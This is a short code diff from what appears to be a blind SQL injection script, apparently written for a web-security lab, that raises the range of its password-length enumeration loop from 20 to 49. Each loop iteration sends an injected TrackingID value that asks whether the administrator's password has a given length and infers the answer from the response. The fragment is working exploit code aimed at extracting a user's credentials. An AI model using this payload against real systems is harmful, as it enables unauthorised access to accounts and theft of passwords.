@@ -19,7 +19,7 @@ def search_text(response):
         return False
 
 def enumerate_password_length():
-    for i in range(1, 21):
+    for i in range(1, 50):
         TrackingID = f"ABC' OR (select username from users where username='administrator' AND LENGTH(password)={i})='administrator"
         response = make_request(TrackingID)
         if search_text(response):
